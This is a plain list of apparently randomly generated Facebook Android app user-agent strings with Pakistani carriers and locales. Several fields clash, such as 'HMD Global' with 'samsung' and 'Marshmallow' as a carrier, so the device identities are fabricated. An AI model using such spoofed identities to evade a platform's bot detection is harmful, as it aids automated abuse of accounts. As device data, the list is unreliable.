"[FBAN/FB4A;FBAV/280.0.0.25.126;FBBV/18198478;FBDM/{density=4.4,width=663,height=2453};FBLC/en_GB;FBRV/73816033;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N910F;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/65.0.0.43.131;FBBV/84254543;FBDM/{density=5.8,width=889,height=2869};FBLC/en_GB;FBRV/44669140;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A516V;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/74.0.0.43.69;FBBV/53827756;FBDM/{density=4.3,width=934,height=1769};FBLC/en_US;FBRV/44383176;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A2070;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/333.0.0.34.70;FBBV/41783105;FBDM/{density=1.9,width=750,height=1811};FBLC/en_US;FBRV/16621320;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M336K;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/193.0.0.48.49;FBBV/33677512;FBDM/{density=4.1,width=657,height=2809};FBLC/en_US;FBRV/18023911;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G955N;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/221.0.0.3.112;FBBV/26380179;FBDM/{density=7.7,width=892,height=1785};FBLC/en_PK;FBRV/96719526;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A510F;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/412.0.0.89.112;FBBV/51035692;FBDM/{density=5.5,width=513,height=1046};FBLC/en_US;FBRV/14544223;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M017F;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/102.0.0.53.22;FBBV/74811573;FBDM/{density=5.4,width=697,height=2483};FBLC/en_US;FBRV/87751901;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A217F;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/123.0.0.53.3;FBBV/80083723;FBDM/{density=6.9,width=1463,height=1117};FBLC/en_US;FBRV/70187616;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9108V;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/242.0.0.51.169;FBBV/52072776;FBDM/{density=2.2,width=1052,height=2118};FBLC/en_PK;FBRV/49730484;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E700H;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/328.0.0.25.171;FBBV/95239026;FBDM/{density=4.9,width=1366,height=1479};FBLC/en_US;FBRV/79559345;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G986B;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/246.0.0.23.158;FBBV/25646285;FBDM/{density=4.8,width=505,height=1645};FBLC/en_GB;FBRV/88563239;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S901U;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/102.0.0.87.20;FBBV/59616909;FBDM/{density=7.3,width=783,height=2851};FBLC/en_GB;FBRV/62239231;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A520F;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/119.0.0.68.72;FBBV/51329565;FBDM/{density=6.2,width=1303,height=2545};FBLC/en_PK;FBRV/28255260;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A920F;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/25.0.0.79.122;FBBV/57122820;FBDM/{density=4.9,width=689,height=1262};FBLC/en_GB;FBRV/87526148;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G887F;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/33.0.0.99.40;FBBV/59025865;FBDM/{density=3.5,width=1102,height=1930};FBLC/en_GB;FBRV/38251538;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737R4;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/206.0.0.31.148;FBBV/91571204;FBDM/{density=7.7,width=1100,height=2862};FBLC/en_GB;FBRV/41333488;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J410F;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/129.0.0.7.50;FBBV/70542038;FBDM/{density=4.8,width=799,height=2942};FBLC/en_US;FBRV/15581277;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A505U;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/142.0.0.38.135;FBBV/67505230;FBDM/{density=1.6,width=764,height=2998};FBLC/en_GB;FBRV/39517901;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N971N;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/343.0.0.3.30;FBBV/44506064;FBDM/{density=7.8,width=1285,height=2027};FBLC/en_PK;FBRV/23921021;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N986B;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/267.0.0.93.74;FBBV/26591628;FBDM/{density=6.1,width=720,height=2138};FBLC/en_GB;FBRV/87702270;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J110G;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/400.0.0.94.5;FBBV/60955423;FBDM/{density=8.8,width=1209,height=2564};FBLC/en_GB;FBRV/19739315;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3858;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/217.0.0.88.35;FBBV/68154976;FBDM/{density=7.6,width=519,height=1864};FBLC/en_US;FBRV/52279830;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J400F;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/424.0.0.92.156;FBBV/32541704;FBDM/{density=1.7,width=1367,height=2897};FBLC/en_US;FBRV/35801231;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920V;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/189.0.0.95.92;FBBV/70105719;FBDM/{density=8.1,width=1314,height=1492};FBLC/en_GB;FBRV/32772249;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G530T1;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/33.0.0.11.156;FBBV/83988508;FBDM/{density=1.7,width=1115,height=2454};FBLC/en_GB;FBRV/30683093;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A536V;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/40.0.0.17.74;FBBV/22123727;FBDM/{density=8.9,width=709,height=2652};FBLC/en_US;FBRV/85624439;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A750GN;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/422.0.0.85.170;FBBV/14479256;FBDM/{density=9.6,width=1332,height=1063};FBLC/en_GB;FBRV/64461802;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M135F;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/384.0.0.85.70;FBBV/55033855;FBDM/{density=5.7,width=1117,height=1070};FBLC/en_GB;FBRV/88093995;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A426B;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/186.0.0.31.192;FBBV/63755671;FBDM/{density=6.2,width=976,height=1059};FBLC/en_GB;FBRV/71876546;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A536E;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/179.0.0.41.37;FBBV/80526279;FBDM/{density=3.7,width=1353,height=2954};FBLC/en_GB;FBRV/90886508;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A107F;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/58.0.0.33.197;FBBV/50965644;FBDM/{density=8.8,width=968,height=1257};FBLC/en_PK;FBRV/23525644;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C105L;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/72.0.0.55.152;FBBV/28746445;FBDM/{density=8.3,width=1238,height=2204};FBLC/en_PK;FBRV/61137104;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G9960;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/421.0.0.48.42;FBBV/92511147;FBDM/{density=4.7,width=526,height=2919};FBLC/en_GB;FBRV/87532855;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M325FV;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/218.0.0.68.91;FBBV/85589011;FBDM/{density=4.9,width=1495,height=1575};FBLC/en_US;FBRV/28203223;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E5000;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/107.0.0.1.129;FBBV/54719631;FBDM/{density=6.8,width=1046,height=1271};FBLC/en_US;FBRV/92457732;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A3050;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/179.0.0.32.18;FBBV/22637272;FBDM/{density=9.7,width=907,height=2747};FBLC/en_PK;FBRV/96807476;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737T1;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/369.0.0.61.26;FBBV/63900268;FBDM/{density=6.4,width=1311,height=2116};FBLC/en_US;FBRV/41649590;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G530BT;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/177.0.0.91.62;FBBV/54974885;FBDM/{density=8.1,width=1366,height=1026};FBLC/en_GB;FBRV/42872638;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G928T;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/257.0.0.64.116;FBBV/59037955;FBDM/{density=3.6,width=1311,height=1342};FBLC/en_GB;FBRV/89869401;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G730V;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/385.0.0.11.84;FBBV/82200704;FBDM/{density=8.6,width=837,height=2770};FBLC/en_GB;FBRV/18133916;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9108V;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/151.0.0.15.81;FBBV/14585654;FBDM/{density=2.6,width=803,height=1685};FBLC/en_GB;FBRV/60956849;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G360T;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/132.0.0.74.52;FBBV/16942014;FBDM/{density=7.2,width=1123,height=1960};FBLC/en_GB;FBRV/92168330;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E426B;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/427.0.0.82.82;FBBV/80372266;FBDM/{density=2.4,width=651,height=2114};FBLC/en_US;FBRV/55091994;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J730FM;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/185.0.0.46.52;FBBV/91676806;FBDM/{density=8.3,width=1445,height=2676};FBLC/en_GB;FBRV/18989188;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N930X;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/28.0.0.33.46;FBBV/82055028;FBDM/{density=6.4,width=963,height=2218};FBLC/en_GB;FBRV/57591674;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A105M;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/410.0.0.78.141;FBBV/94270517;FBDM/{density=5.1,width=912,height=2755};FBLC/en_GB;FBRV/84004650;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737VPP;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/265.0.0.64.7;FBBV/48214715;FBDM/{density=3.2,width=1409,height=2087};FBLC/en_PK;FBRV/19835142;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung 9005;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/417.0.0.21.153;FBBV/66546578;FBDM/{density=6.7,width=902,height=2925};FBLC/en_PK;FBRV/43434504;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G998B;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/379.0.0.1.104;FBBV/34434038;FBDM/{density=7.5,width=1325,height=1502};FBLC/en_US;FBRV/77578642;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A750GN;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/23.0.0.9.177;FBBV/34232434;FBDM/{density=7.7,width=1289,height=2555};FBLC/en_PK;FBRV/40686770;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A032M;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/63.0.0.48.112;FBBV/89523300;FBDM/{density=9.9,width=685,height=2012};FBLC/en_GB;FBRV/40326382;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E700H;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/31.0.0.40.110;FBBV/36265623;FBDM/{density=9.2,width=1386,height=2156};FBLC/en_GB;FBRV/94980120;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G360M;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/238.0.0.73.33;FBBV/79785191;FBDM/{density=9.2,width=928,height=2538};FBLC/en_GB;FBRV/11253745;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N910H;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/30.0.0.1.131;FBBV/67885567;FBDM/{density=6.3,width=943,height=2828};FBLC/en_US;FBRV/38633448;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N900P;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/313.0.0.99.6;FBBV/48447473;FBDM/{density=3.6,width=895,height=2309};FBLC/en_GB;FBRV/78276823;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G960U1;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/95.0.0.61.200;FBBV/50846913;FBDM/{density=8.3,width=549,height=1509};FBLC/en_GB;FBRV/99707347;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C115W;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/191.0.0.44.23;FBBV/36064852;FBDM/{density=1.2,width=1068,height=2698};FBLC/en_GB;FBRV/33156434;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G531H;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/191.0.0.49.107;FBBV/77544360;FBDM/{density=5.8,width=718,height=2142};FBLC/en_US;FBRV/41064297;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737A;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/280.0.0.18.83;FBBV/93018340;FBDM/{density=6.6,width=741,height=1836};FBLC/en_GB;FBRV/54074662;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N971N;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/361.0.0.79.185;FBBV/85599508;FBDM/{density=5.7,width=757,height=2017};FBLC/en_US;FBRV/61594833;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G355M;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/127.0.0.62.190;FBBV/38159975;FBDM/{density=1.8,width=895,height=1814};FBLC/en_PK;FBRV/58357986;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M536B;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/62.0.0.83.88;FBBV/24532978;FBDM/{density=9.8,width=865,height=2931};FBLC/en_GB;FBRV/18052817;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A260G;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/272.0.0.38.14;FBBV/36318452;FBDM/{density=6.1,width=1070,height=1884};FBLC/en_PK;FBRV/57208022;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung F907B;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/152.0.0.19.181;FBBV/93152841;FBDM/{density=9.6,width=1101,height=2205};FBLC/en_US;FBRV/83312669;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C9000;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/121.0.0.97.197;FBBV/91593930;FBDM/{density=6.9,width=1013,height=2773};FBLC/en_GB;FBRV/48609849;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C500X;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/141.0.0.66.43;FBBV/51955141;FBDM/{density=5.5,width=796,height=1858};FBLC/en_GB;FBRV/89631261;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G955W;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/279.0.0.57.178;FBBV/94202350;FBDM/{density=3.2,width=945,height=1262};FBLC/en_US;FBRV/32406083;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A515U;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/140.0.0.95.85;FBBV/63339629;FBDM/{density=9.5,width=1201,height=1798};FBLC/en_GB;FBRV/86059654;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A9080;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/74.0.0.34.197;FBBV/44822131;FBDM/{density=3.7,width=1298,height=1297};FBLC/en_PK;FBRV/97518684;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A107F;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/385.0.0.34.71;FBBV/65782655;FBDM/{density=5.4,width=1131,height=2416};FBLC/en_US;FBRV/71699137;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M426B;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/393.0.0.39.33;FBBV/74158363;FBDM/{density=8.8,width=1483,height=2025};FBLC/en_GB;FBRV/36145346;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J510FN;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/332.0.0.6.119;FBBV/97015526;FBDM/{density=6.4,width=1465,height=2708};FBLC/en_GB;FBRV/83553047;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G532MT;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/393.0.0.28.40;FBBV/44510377;FBDM/{density=7.2,width=1381,height=1902};FBLC/en_GB;FBRV/69503854;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C1158;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/395.0.0.53.161;FBBV/77307013;FBDM/{density=8.1,width=529,height=2334};FBLC/en_GB;FBRV/49990632;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S908U;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/77.0.0.79.185;FBBV/68516950;FBDM/{density=8.2,width=647,height=1434};FBLC/en_GB;FBRV/17995339;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A510Y;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/121.0.0.55.2;FBBV/64583821;FBDM/{density=6.1,width=1170,height=2839};FBLC/en_PK;FBRV/97765331;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J730F;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/252.0.0.27.144;FBBV/93315557;FBDM/{density=8.9,width=1433,height=1566};FBLC/en_PK;FBRV/84982674;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J260G;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/220.0.0.44.183;FBBV/30118544;FBDM/{density=8.3,width=702,height=2735};FBLC/en_PK;FBRV/24426826;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J320G;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/345.0.0.59.167;FBBV/56656933;FBDM/{density=7.5,width=1168,height=2609};FBLC/en_PK;FBRV/20687547;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J111M;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/164.0.0.57.114;FBBV/43819537;FBDM/{density=4.1,width=954,height=1335};FBLC/en_GB;FBRV/50843116;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J400F;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/365.0.0.32.69;FBBV/24320970;FBDM/{density=3.4,width=932,height=2788};FBLC/en_GB;FBRV/79492198;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J260F;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/34.0.0.93.58;FBBV/26344064;FBDM/{density=3.9,width=1118,height=1830};FBLC/en_US;FBRV/43628858;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G6000;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/191.0.0.27.27;FBBV/45587551;FBDM/{density=4.9,width=602,height=2548};FBLC/en_PK;FBRV/83252640;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G977N;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/386.0.0.27.22;FBBV/12419927;FBDM/{density=8.2,width=1474,height=2835};FBLC/en_US;FBRV/42965609;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A205F;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/222.0.0.17.170;FBBV/60597931;FBDM/{density=2.9,width=909,height=1086};FBLC/en_US;FBRV/43138877;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A300H;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/20.0.0.20.168;FBBV/19175345;FBDM/{density=4.6,width=729,height=1292};FBLC/en_PK;FBRV/22431194;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J701F;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/45.0.0.58.192;FBBV/80664244;FBDM/{density=8.4,width=904,height=1140};FBLC/en_PK;FBRV/88342420;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G6200;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/346.0.0.29.60;FBBV/74489168;FBDM/{density=3.8,width=798,height=2549};FBLC/en_PK;FBRV/87250851;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G890A;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/350.0.0.64.27;FBBV/19914138;FBDM/{density=4.3,width=1463,height=1859};FBLC/en_GB;FBRV/65908391;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A205U;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
